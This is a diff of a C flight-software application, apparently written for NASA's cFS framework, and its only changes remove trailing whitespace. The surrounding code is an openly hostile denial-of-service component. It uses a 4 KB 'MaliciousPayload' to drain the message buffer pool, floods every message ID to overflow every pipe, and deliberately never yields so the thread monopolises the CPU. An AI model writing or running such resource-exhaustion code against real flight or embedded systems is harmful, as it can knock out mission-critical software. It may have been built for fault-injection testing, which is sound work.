@@ -7,14 +7,14 @@
 #define BEACON_PING_FC      2
 #define TRIGGER_THRESHOLD   3
 
-/* * MAXIMIZED PAYLOAD: 
+/* * MAXIMIZED PAYLOAD:
  * We use a 4KB payload. 512KB Buffer Pool / 4KB = ~128 messages.
  * The memory pool will be completely exhausted in a fraction of a millisecond.
  */
 typedef struct
 {
     CFE_MSG_CommandHeader_t CmdHeader;
-    uint8                   MaliciousPayload[4096]; 
+    uint8                   MaliciousPayload[4096];
 } NOISY_APP_Pkt_t;
 
 void NOISY_APP_Main(void)
@@ -81,9 +81,9 @@ void NOISY_APP_Main(void)
                 burn += i * i;
             }
 
-            /* * CARPET BOMBING: 
+            /* * CARPET BOMBING:
              * Loop through every possible MID in the cFS architecture (0x0000 to 0x1FFF).
-             * Send exactly 4 packets to each. This bypasses the Subscription Limit 
+             * Send exactly 4 packets to each. This bypasses the Subscription Limit
              * but guarantees EVERY pipe in the system overflows instantly.
              */
             for (uint16 current_mid = 0x0000; current_mid <= 0x1FFF; current_mid++)
@@ -96,7 +96,7 @@ void NOISY_APP_Main(void)
                 }
             }
 
-            /* * NO YIELD: We intentionally do NOT call OS_TaskDelay(). 
+            /* * NO YIELD: We intentionally do NOT call OS_TaskDelay().
              * Running at Priority 20, this thread permanently hijacks the CPU.
              */
         }
